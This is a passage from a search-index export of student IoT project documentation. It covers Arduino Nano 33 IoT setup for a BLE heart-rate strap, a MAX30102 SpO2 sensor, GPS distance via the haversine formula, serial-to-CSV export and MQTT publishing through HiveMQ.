Arduino Nano 33 IoT from the list.  Port Selection​  Select the appropriate port under Tools &gt; Port. The correct port usually corresponds to the one associated with the connected Arduino.  Steps: Click on Tools in the menu bar.Select Port.Choose the port that corresponds to your Arduino Nano 33 IoT (e.g., COM3 on Windows or /dev/ttyUSB0 on Linux).  c. Upload the Program​  Upload​  Click the upload button in the Arduino IDE to transfer the code to the Arduino. The status bar will confirm when the upload is complete.  Steps: Click the upload button (right-pointing arrow) in the Arduino IDE toolbar.Wait for the status bar to indicate that the upload is complete.Monitor any error messages during the upload process and resolve them if necessary.  d. Open Serial Monitor​  Serial Monitor​  Open the Serial Monitor from Tools &gt; Serial Monitor to view the heart rate data. Ensure the baud rate is set to 9600. The heart rate data will be displayed in real-time.  Steps: Click on Tools in the menu bar.Select Serial Monitor.Set the baud rate to 9600 in the Serial Monitor window.Observe the heart rate data being printed in real-time.  ","version":"Next","tagName":"h3"},{"title":"9. Accessing the Code on GitHub​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#9-accessing-the-code-on-github","content":" To access the complete code used in this guide, visit the following GitHub repository: Heart Rate Sensor Code  ","version":"Next","tagName":"h2"},{"title":"Troubleshooting Tips​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#troubleshooting-tips","content":" ","version":"Next","tagName":"h2"},{"title":"BLE Initialization Failure​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#ble-initialization-failure","content":" Check Power Supply​  Ensure the Arduino Nano 33 IoT is properly powered via USB.  Explanation: Inadequate power supply can cause initialization failures. Ensure the USB connection is secure and the power source is stable.Steps: Verify that the USB cable is properly connected to both the Arduino and the computer.Ensure the computer's USB port is functioning correctly.  Reinstall Library​  Try reinstalling the ArduinoBLE library if initialization continues to fail.  Explanation: A corrupted or outdated library can cause issues. Reinstalling ensures you have the latest and correct version.Steps: Open the Library Manager in the Arduino IDE.Locate the ArduinoBLE library and uninstall it.Reinstall the library and restart the Arduino IDE.  ","version":"Next","tagName":"h3"},{"title":"Device Not Found​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#device-not-found","content":" Ensure Sensor is On​  The Wahoo TICKR must be turned on and within range for the Arduino to detect it.  Explanation: The sensor should be active and in pairing mode. Check the LED indicators to confirm its status.Steps: Check that the sensor is powered on and the LED indicators are blinking as expected.Ensure the sensor is within the Bluetooth range of the Arduino.  Minimize Interference​  Reduce other Bluetooth devices to minimize interference during scanning.  Explanation: Multiple active Bluetooth devices can cause signal interference, making it difficult to detect the sensor.Steps: Turn off other nearby Bluetooth devices or move them away from the Arduino and sensor.Retry the scanning process in a less congested environment.  ","version":"Next","tagName":"h3"},{"title":"Connection Issues​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#connection-issues","content":" Restart Devices​  Restart both the Wahoo TICKR and Arduino Nano 33 IoT to reset connections.  Explanation: Sometimes, restarting the devices can resolve temporary connection issues caused by software glitches.Steps: Turn off the Wahoo TICKR, wait for a few seconds, and then turn it back on.Disconnect and reconnect the Arduino Nano 33 IoT from the computer.Retry the connection process.  ","version":"Next","tagName":"h3"},{"title":"Video Tutorial​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#video-tutorial","content":" For a video tutorial, watch this YouTube video. ","version":"Next","tagName":"h2"},{"title":"Integrated Code Document","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur","content":"","keywords":"","version":"Next"},{"title":"Schematic Diagram​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#schematic-diagram","content":"   ","version":"Next","tagName":"h2"},{"title":"Code Functionality​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#code-functionality","content":" The code integrates an Arduino board with various sensors to create a multi-sensory data acquisition system. It captures data from the following sensors:  Accelerometer (IMU): Measures acceleration along the X, Y, and Z axes, enabling movement detection and safety monitoring (e.g., identifying high-acceleration events).Blood Oxygen Sensor (MAX30102): Estimates blood oxygen saturation (SpO2) using pulse oximetry.Heart Rate Sensor (BLE): Reads heart rate data from a Bluetooth Low Energy (BLE) device, typically a fitness tracker or chest strap.GPS (TinyGPSPlus): Tracks geographical location using GPS data received through a serial port (Serial1).  ","version":"Next","tagName":"h2"},{"title":"The code performs the following key tasks:​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#the-code-performs-the-following-key-tasks","content":" Initialization: Sets up serial communication (Serial and Serial1) for data output and GPS input.Initializes the IMU, Blood Oxygen Sensor, BLE, and GPS modules using specific libraries (Arduino_LSM6DS3, ArduinoBLE, TinyGPSPlus, DFRobot_BloodOxygen_S_I2C).Defines constants and variables like thresholds, intervals, and sensor instances. Continuous Loop: Accelerometer and Kalman Filter: Reads accelerometer data at regular intervals (INTERVAL) using IMU.readAcceleration().Implements a Kalman filter (KalmanFilter) to reduce noise and improve data accuracy in the X, Y, and Z readings.Calculates total acceleration and determines direction using determineDirection().Prints acceleration, direction, and high-acceleration alerts (Serial.println()). BLE and Blood Oxygen Sensor: Periodically calls discoverAndConnect() to discover and connect to the BLE device (e.g., TICKR 0A5B).Polls for BLE events (BLE.poll()).Checks for characteristic value updates within a BLE interval (BLE_INTERVAL). If updated, calls printData() to process and print heart rate and SpO2 data.Reads SpO2 data from the Blood Oxygen Sensor using MAX30102.getHeartbeatSPO2(). GPS: Updates GPS data at intervals (GPS_INTERVAL) using updateGPS().Reads available GPS data from Serial1.Parses the data using TinyGPSPlus.encode().Checks if a valid location is obtained (gps.location.isValid()). If so, calculates distance traveled using the haversine() function and prints it (Serial.println()).  ","version":"Next","tagName":"h3"},{"title":"Necessary Libraries and Installation​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#necessary-libraries-and-installation","content":" The code relies on several external libraries to interact with the sensors and perform specific tasks. Here's how to install them:  Arduino_LSM6DS3: For the LSM6DS3 accelerometer/gyroscope. Open the Arduino IDE.Go to Sketch -&gt; Include Library -&gt; Manage Libraries.Search for &quot;Arduino_LSM6DS3&quot; in the search bar.Click on &quot;Install&quot; for the library. ArduinoBLE: For Bluetooth Low Energy communication. Follow the same steps as for Arduino_LSM6DS3, but search for &quot;ArduinoBLE&quot;. TinyGPSPlus: For parsing GPS data. Follow the same steps as for Arduino_LSM6DS3, but search for &quot;TinyGPSPlus&quot;. DFRobot_BloodOxygen_S_I2C: For the MAX30102 blood oxygen sensor. Download the library from the provided repository.Unzip the downloaded file.Copy the unzipped folder (usually named DFRobot_BloodOxygen_S_I2C) to your Arduino libraries folder. This is typically located at Documents/Arduino/libraries on Windows or consult the Arduino IDE documentation for your specific operating system.    ","version":"Next","tagName":"h2"},{"title":"Challenges Faced and Solutions​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#challenges-faced-and-solutions","content":" The development process encountered a few challenges that were addressed through code modifications and potential hardware considerations:  Overlapping Time Intervals: The initial code used the same interval for all sensors, which could lead to missed readings from some sensors. This is resolved by setting different intervals based on sensor requirements: 5 seconds for accelerometer and SpO2 (less critical for continuous monitoring). BLE Disconnection due to Prolonged Delays: Delays in processing sensor data, especially from the GPS, could cause the BLE connection to drop. Here are two approaches to address this: Code Optimization: Review the code and optimize calculations or data processing tasks to minimize delays.Increase BLE Interval: If optimization is limited, consider increasing the BLE interval (BLE_INTERVAL) to allow more time for other sensor readings. This is a trade-off between BLE data frequency and potential disconnections. Power Supply Limitations: Supplying enough power for all sensors simultaneously can be challenging. Here are some strategies: Battery Selection: Use a battery with sufficient capacity to handle the combined sensor power consumption.Power Management Techniques: Implement power management techniques in the code, such as putting unused sensors in sleep mode to reduce power draw.External Power Source: If battery capacity is insufficient, consider using an external power supply. Data Synchronization Issues: With multiple sensors collecting data at different intervals, ensuring that the data is synchronized can be difficult. This can be resolved by: -Timestamping Data: Implementing a system where each data reading is timestamped when collected, allowing for proper synchronization during data analysis.  ","version":"Next","tagName":"h2"},{"title":"Things to Keep in Mind While Integrating Sensors​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#things-to-keep-in-mind-while-integrating-sensors","content":" Here are some crucial aspects to consider when integrating various sensors into your project:  Sensor Compatibility: Ensure compatibility between the sensors and the Arduino board in terms of voltage levels, communication protocols (I2C, SPI, etc.), and library support. Sensor Power Requirements: Check the power consumption of each sensor and choose a power supply that can handle the combined load. Sensor Data Rates: Consider the data rates of each sensor and ensure the Arduino can process the data efficiently without overwhelming its resources. Sensor Placement: Proper sensor placement is crucial for accurate data collection. For example, the accelerometer should be securely mounted to capture valid motion data. Refer to the sensor's datasheet for recommended placement guidelines. Calibration: Some sensors may require calibration to ensure accurate readings. Follow the calibration procedures outlined in the sensor's datasheet. Data Fusion: While this code focuses on collecting data from individual sensors, you can explore data fusion techniques to combine information from multiple sensors for a richer understanding of the monitored system. Baud Rate Mismatch Ensure that all devices using serial communication (like GPS) are set to the correct baud rate. Function Conflicts Ensure that integrating the accelerometer code does not interfere with the functions or libraries used by the heart rate and GPS sensors. Buffer Overflows Serial buffers might overflow if not read frequently enough. Ensure your code is reading serial data as quickly as it is being received.  ","version":"Next","tagName":"h2"},{"title":"Additional Notes​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#additional-notes","content":" The code uses the haversine() function to calculate distance between GPS coordinates. This function assumes a spherical Earth model, which may introduce slight inaccuracies for very large distances.The Blood Oxygen Sensor readings (SpO2) obtained from this code are estimates and may not be as accurate as medical-grade pulse oximeters.Consider adding comments throughout the code to explain specific sections and functions, improving code readability and maintainability.  ","version":"Next","tagName":"h2"},{"title":"Data Flow Diagram​","type":1,"pageTitle":"Integrated Code Document","url":"/redback-documentation/docs/project-4/iot/final-code-documentation-and-tips-for-futur#data-flow-diagram","content":"   Integrating multiple sensors into a single system offers both challenges and rewards. By addressing specific issues such as overlapping time intervals, BLE disconnections, and power supply management, the final system provides a robust platform for collecting and processing sensor data. This project serves as a valuable lesson in hardware integration, software optimization, and practical application of sensor technology. ","version":"Next","tagName":"h2"},{"title":"Guide to Exporting Sensor Data from Serial Monitor to CSV","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#introduction","content":" This guide provides step-by-step instructions on how to collect data from the MAX30102 sensor using an Arduino and export this data to a CSV file through the serial monitor. This process is essential for further analysis and visualization of the sensor data.  ","version":"Next","tagName":"h2"},{"title":"Arduino Setup​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#arduino-setup","content":" ","version":"Next","tagName":"h2"},{"title":"Sensor Code​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#sensor-code","content":" Below is the Arduino code required to initialize the MAX30102 sensor and send its data (heart rate and oxygen saturation) to the serial monitor.  #include &quot;DFRobot_BloodOxygen_S.h&quot; // Define the I2C address for the MAX30102 sensor #define I2C_ADDRESS 0x57 // Create an instance of the DFRobot_BloodOxygen_S_I2C class for I2C communication DFRobot_BloodOxygen_S_I2C MAX30102(&amp;Wire, I2C_ADDRESS); void setup() { // Initialize serial communication at a baud rate of 115200 Serial.begin(115200); // Attempt to initialize the MAX30102 sensor while (false == MAX30102.begin()) { Serial.println(&quot;init fail!&quot;); delay(1000); } Serial.println(&quot;init success!&quot;); Serial.println(&quot;start measuring...&quot;); MAX30102.sensorStartCollect(); } void loop() { // Retrieve the heartbeat and SPO2 data from the sensor MAX30102.getHeartbeatSPO2(); // Print the SPO2 value to the serial monitor Serial.print(&quot;SPO2 is : &quot;); Serial.print(MAX30102._sHeartbeatSPO2.SPO2); Serial.println(&quot;%&quot;); // The sensor updates the data every 4 seconds, so delay for 4 seconds before the next read delay(4000); }   ","version":"Next","tagName":"h3"},{"title":"Python Script for Data Collection​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#python-script-for-data-collection","content":" ","version":"Next","tagName":"h2"},{"title":"Setup and Execution​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#setup-and-execution","content":" Here's a Python script that sets up a serial connection to read the data from the serial port and saves it to a CSV file for later analysis.  # Save this as collect_data.py import serial import time # Setup your serial port and baud rate. Replace '/dev/tty.usbmodemXXXX' with your actual device port serial_port = '/dev/tty.usbmodemXXXX' baud_rate = 115200 try: ser = serial.Serial(serial_port, baud_rate) time.sleep(2) # Allow time for serial connection to initialize print(&quot;Connected to Arduino. Collecting data...&quot;) with open(&quot;output.csv&quot;, &quot;w&quot;) as file: while True: data = ser.readline().decode().strip() # read data from serial and decode it file.write(data + &quot;\\n&quot;) # write data to CSV file print(data) # print data to console except serial.SerialException: print(f&quot;Failed to connect on {serial_port}&quot;) except KeyboardInterrupt: print(&quot;Interrupted by user, stopping data collection.&quot;) finally: ser.close() # Ensure serial connection is closed on exit   ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Guide to Exporting Sensor Data from Serial Monitor to CSV","url":"/redback-documentation/docs/project-4/iot/Export_Sensor_Data_to_CSV_Guide#conclusion","content":" This guide provides a comprehensive method to capture sensor data from the MAX30102 and export it to a CSV file using Arduino and Python. This setup is ideal for those who need to collect and analyze physiological data for health monitoring or research purposes. ","version":"Next","tagName":"h2"},{"title":"FSM and Closed-loop Integration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/FSM_and_closed_loop_integration","content":"FSM and Closed-loop Integration","keywords":"","version":"Next"},{"title":"Future Enhancements for PiCam Setup","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Future-Enhancements-for-Pi-Cam-Setup","content":"Future Enhancements for PiCam Setup","keywords":"","version":"Next"},{"title":"GPS Code Document","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document","content":"","keywords":"","version":"Next"},{"title":"Haversine Formula​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#haversine-formula","content":" The Haversine formula is used to calculate the shortest distance between two points on a sphere, given their latitude and longitude coordinates. It's commonly used in navigation and GIS (Geographic Information Systems) applications to compute distances between locations on Earth, where the Earth's surface can be approximated as a sphere.    Δlat is the difference in latitude between the two points (in radians),Δlon is the difference in longitude between the two points (in radians),lat1 and lat2 are the latitudes of the two points (in radians),R is the radius of the Earth (mean radius = 6,371,000 meters or 6,371 kilometers),a is the square of half the chord length between the points,c is the angular distance between those points in radians,d is the distance between the two points (in the same units as the radius of the Earth).  GitHub: Working GPS Code  ","version":"Next","tagName":"h2"},{"title":"Explanation of the Code​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#explanation-of-the-code","content":" ","version":"Next","tagName":"h2"},{"title":"1. Library Inclusions and Object Initialization:​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#1-library-inclusions-and-object-initialization","content":" TinyGPSPlus gps;: Creates an instance of the TinyGPS++ object for GPS data processing.#define EARTH_RADIUS 6371000: Defines the Earth's radius in meters.  ","version":"Next","tagName":"h3"},{"title":"2. Conversion Function:​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#2-conversion-function","content":" double toRadians(double degree): Converts degrees to radians using the formula: radians = degrees × (π / 180)   ","version":"Next","tagName":"h3"},{"title":"3. Haversine Formula Function:​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#3-haversine-formula-function","content":" double haversine(double lat1, double lon1, double lat2, double lon2): Converts the latitude and longitude differences from degrees to radians.Computes the haversine of the central angle using the differences.Calculates the angular distance c using atan2.Returns the distance d by multiplying c with the Earth's radius.  ","version":"Next","tagName":"h3"},{"title":"4. Setup Function:​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#4-setup-function","content":" Serial.begin(9600);: Initializes serial communication for debugging.Serial1.begin(9600);: Initializes serial communication with the GPS module.  ","version":"Next","tagName":"h3"},{"title":"5. Loop Function:​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#5-loop-function","content":" Reads GPS data from the GPS module.Checks if the GPS data is valid and retrieves the current latitude and longitude.Calculates the distance between the current and previous coordinates every 5 seconds.Prints the previous and current coordinates and the calculated distance to the serial monitor.Updates the previous coordinates and time for the next calculation.  ","version":"Next","tagName":"h3"},{"title":"Summary​","type":1,"pageTitle":"GPS Code Document","url":"/redback-documentation/docs/project-4/iot/Haversine-gps-document#summary","content":" The Haversine formula is a fundamental tool for calculating distances between two points on the Earth's surface using latitude and longitude. This detailed explanation and the provided Arduino code illustrate how to implement the formula in a practical project, enhancing navigation and GIS applications. By understanding the formula and the code, you can accurately compute distances between geographic locations using Arduino. ","version":"Next","tagName":"h2"},{"title":"Hive MQTT Implementation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/HIVEMQ-report","content":"Hive MQTT Implementation","keywords":"","version":"Next"},{"title":"IMU (Accelerometer_LSM6D3) Data Collection Process","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/IMU_accelerometer_data_collection_proccess","content":"Last updated by: Kaleb, Last updated on: '20/05/2024' Last updated by: Kaleb, Last updated on: '20/05/2024' IMU (Accelerometer_LSM6D3) Data Collection Process","keywords":"","version":"Next"},{"title":"Implementing HiveMQ and MQTT in Sensor Data Collection","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#introduction","content":" This report explores the integration of HiveMQ and MQTT protocols in our project to facilitate efficient and reliable data communication. Focusing on the MAX30102 sensor setup, we explain how MQTT can be utilized to transmit sensor data, such as heart rate and oxygen saturation, over a network.  ","version":"Next","tagName":"h2"},{"title":"Understanding MQTT​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#understanding-mqtt","content":" MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol designed for low-bandwidth, high-latency or unreliable networks. It is ideal for IoT applications because it ensures data delivery with minimal bandwidth usage.  ","version":"Next","tagName":"h2"},{"title":"Core Concepts​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#core-concepts","content":" Publisher-Subscriber Model: MQTT uses a pub-sub model where devices publish messages to topics, and clients subscribe to topics to receive messages.Broker: The central point of message distribution, handling the dissemination of all messages between publishers and subscribers. HiveMQ is a robust MQTT broker designed for enterprise-scale deployment.  ","version":"Next","tagName":"h3"},{"title":"Role of HiveMQ​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#role-of-hivemq","content":" HiveMQ is an MQTT broker that enhances MQTT implementations with its high scalability, easy integration with enterprise systems, and robust security features. It facilitates the management of large-scale IoT applications and supports the seamless transmission of telemetry data.  ","version":"Next","tagName":"h2"},{"title":"Implementing MQTT with Arduino​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#implementing-mqtt-with-arduino","content":" ","version":"Next","tagName":"h2"},{"title":"Sensor Setup​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#sensor-setup","content":" The sensor setup remains the same as outlined in the previous guide. Here is a brief overview with additional MQTT implementation:  #include &quot;DFRobot_BloodOxygen_S.h&quot; #include &lt;PubSubClient.h&gt; // MQTT client library // Define the I2C address and create an instance of the sensor class #define I2C_ADDRESS 0x57 DFRobot_BloodOxygen_S_I2C MAX30102(&amp;Wire, I2C_ADDRESS); // Setup MQTT parameters const char* mqtt_server = &quot;broker.hivemq.com&quot;; const char* topic = &quot;sensor/data&quot;; const char* clientID = &quot;unique_client_id&quot;; WiFiClient espClient; PubSubClient client(espClient); void setup() { Serial.begin(115200); WiFi.begin(&quot;SSID&quot;, &quot;password&quot;); // Connect to Wi-Fi client.setServer(mqtt_server, 1883); // Connect to MQTT broker while (false == MAX30102.begin()) { Serial.println(&quot;init fail!&quot;); delay(1000); } Serial.println(&quot;init success!&quot;); Serial.println(&quot;start measuring...&quot;); MAX30102.sensorStartCollect(); } void loop() { if (!client.connected()) { reconnect(); } client.loop(); // Collect data MAX30102.getHeartbeatSPO2(); String payload = &quot;SPO2 is: &quot; + String(MAX30102._sHeartbeatSPO2.SPO2) + &quot;%&quot;; Serial.println(payload); client.publish(topic, payload.c_str()); delay(4000); } void reconnect() { // Reconnect to the MQTT broker while (!client.connected()) { Serial.print(&quot;Attempting MQTT connection...&quot;); if (client.connect(clientID)) { Serial.println(&quot;connected&quot;); } else { Serial.print(&quot;failed, rc=&quot;); Serial.print(client.state()); Serial.println(&quot; try again in 5 seconds&quot;); delay(5000); } } }   ","version":"Next","tagName":"h3"},{"title":"Python Script for Monitoring (Subscriber)​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#python-script-for-monitoring-subscriber","content":" The Python script acts as a subscriber, receiving data published to the MQTT topic.  import paho.mqtt.client as mqtt def on_connect(client, userdata, flags, rc): print(&quot;Connected with result code &quot;+str(rc)) client.subscribe(&quot;sensor/data&quot;) def on_message(client, userdata, msg): print(msg.topic+&quot; &quot;+str(msg.payload)) client = mqtt.Client() client.on_connect = on_connect client.on_message = on_message client.connect(&quot;broker.hivemq.com&quot;, 1883, 60) client.loop_forever()   ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Implementing HiveMQ and MQTT in Sensor Data Collection","url":"/redback-documentation/docs/project-4/iot/HiveMQ_MQTT_Implementation_Guide#conclusion","content":" The integration of HiveMQ and MQTT into our sensor data collection project allows for robust, scalable, and efficient data communication. This setup ensures real-time data monitoring across different platforms, enhancing the capabilities of IoT applications in health monitoring. ","version":"Next","tagName":"h2"},{"title":"Kalman Filter Tutorial with Notes","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/kalmanFilterTutorial","content":"Kalman Filter Tutorial with Notes INFO Author: Bhumika Chauhan Here's a tutorial on Kalman Filter with handwritten notes: For more, please visit this link. If you're interested in more detailed notes, check out my handwritten notes available here: Access Handwritten Notes","keywords":"","version":"Next"},{"title":"Mongo DB and Node.js Installation Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/mongo-guide","content":"Mongo DB and Node.js Installation Guide","keywords":"","version":"Next"},{"title":"Integration of the MAX30102 Sensor in Our Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#introduction","content":" The MAX30102 sensor is integral to our player tracking and crowd monitoring system, chosen for its accuracy in monitoring oxygen saturation (SpO2) and heart rate. This document elaborates on the MAX30102’s features and their alignment with our project’s objectives, enhancing real-time health monitoring in dynamic environments.  ","version":"Next","tagName":"h2"},{"title":"Sensor Overview​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#sensor-overview","content":" ","version":"Next","tagName":"h2"},{"title":"Key Features​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#key-features","content":" High Sensitivity: Detects subtle changes in oxygen levels and pulse rates.Low Power Consumption: Ideal for extended monitoring, minimizing battery replacements.Compact Design: Small form factor facilitates integration into wearable devices.  ","version":"Next","tagName":"h3"},{"title":"Technical Specifications​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#technical-specifications","content":" Components: Integrated LEDs, photodetector, and advanced signal processing.Interface: I2C, for straightforward microcontroller integration.Applications: Well-suited for medical and fitness devices such as smartwatches and fitness bands.  ","version":"Next","tagName":"h3"},{"title":"Wiring and Installation​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#wiring-and-installation","content":" ","version":"Next","tagName":"h2"},{"title":"Wiring Summary​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#wiring-summary","content":" VIN: Connect to 3.3V on Arduino Nano 33 IoT.GND: Connect to GND on Arduino Nano 33 IoT.SCL: Connect to SCL (A5) on Arduino Nano 33 IoT.SDA: Connect to SDA (A4) on Arduino Nano 33 IoT.  ","version":"Next","tagName":"h3"},{"title":"Library Installation​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#library-installation","content":" Library Name: MAX30105 (compatible with MAX30102)Developer: Maxim Integrated, now part of Analog DevicesFeatures: Facilitates sensor initialization, configuration, and data reading.Installation Guide: In Arduino IDE, go to Sketch &gt; Include Library &gt; Manage Libraries...Search for &quot;MAX30105&quot; and install.  ","version":"Next","tagName":"h3"},{"title":"Arduino Code Example​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#arduino-code-example","content":" This sample Arduino code demonstrates how to set up and read data from the MAX30102 sensor using the DFRobot_BloodOxygen_S library.  #include &quot;DFRobot_BloodOxygen_S.h&quot; // Define the I2C address for the MAX30102 sensor #define I2C_ADDRESS 0x57 // Create an instance of the DFRobot_BloodOxygen_S_I2C class for I2C communication DFRobot_BloodOxygen_S_I2C MAX30102(&amp;Wire, I2C_ADDRESS); void setup() { // Initialize serial communication at a baud rate of 115200 Serial.begin(115200); // Attempt to initialize the MAX30102 sensor while (false == MAX30102.begin()) { Serial.println(&quot;init fail!&quot;); delay(1000); } Serial.println(&quot;init success!&quot;); Serial.println(&quot;start measuring...&quot;); MAX30102.sensorStartCollect(); } void loop() { // Retrieve the heartbeat and SPO2 data from the sensor MAX30102.getHeartbeatSPO2(); Serial.print(&quot;SPO2 is : &quot;); Serial.print(MAX30102._sHeartbeatSPO2.SPO2); Serial.println(&quot;%&quot;); // Delay for 4 seconds before the next read delay(4000); }   ","version":"Next","tagName":"h2"},{"title":"Product and Documentation Links​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#product-and-documentation-links","content":" DFRobot Product PageDFRobot Wiki for Heart Rate and Oximeter Sensor  ","version":"Next","tagName":"h2"},{"title":"Benefits for Player Tracking and Crowd Monitoring​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#benefits-for-player-tracking-and-crowd-monitoring","content":" ","version":"Next","tagName":"h2"},{"title":"Real-Time Health Monitoring​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#real-time-health-monitoring","content":" Continuous monitoring of physiological parameters provides immediate response capabilities for health anomalies.  ","version":"Next","tagName":"h3"},{"title":"Enhanced Player Safety​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#enhanced-player-safety","content":" Monitors health status during physical activities to prevent injuries and ensure safety.  ","version":"Next","tagName":"h3"},{"title":"Crowd Safety Management​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our Project","url":"/redback-documentation/docs/project-4/iot/MAX30102_Sensor_Documentation_Updated#crowd-safety-management","content":" Analyzes health trends within large gatherings, aiding in the preemptive management of potential health incidents.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Integration of the MAX30102 Sensor in Our 